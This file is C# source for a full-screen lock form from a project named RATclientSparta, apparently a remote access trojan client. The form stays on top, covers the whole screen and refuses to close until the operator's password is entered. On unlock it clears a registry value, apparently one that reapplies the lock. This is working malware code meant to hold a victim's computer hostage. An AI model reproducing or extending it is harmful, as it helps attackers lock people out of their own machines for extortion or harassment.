using RATclientSparta.Setup.RegistryData;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RATclientSparta.Tools.Screen
{
    public partial class ScreenLock : Form
    {
        private string password;
        public ScreenLock(string password)
        {
            InitializeComponent();
            this.TopMost = true;
            this.FormBorderStyle = FormBorderStyle.None;
            this.WindowState = FormWindowState.Maximized;
            this.FormClosing += CloseTry;
            this.password = password;
        }

        private bool PasswordCheck()
        {
            if (this.password != this.textBox1.Text)
                return false;
            RegistryDelete.DeleteValue("ScreenLock");
            return true;
        }

        private void CloseTry(object sender, FormClosingEventArgs e)
        {
            if(!PasswordCheck())
                e.Cancel = true;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (PasswordCheck())
                this.Close();

        }
    }
}
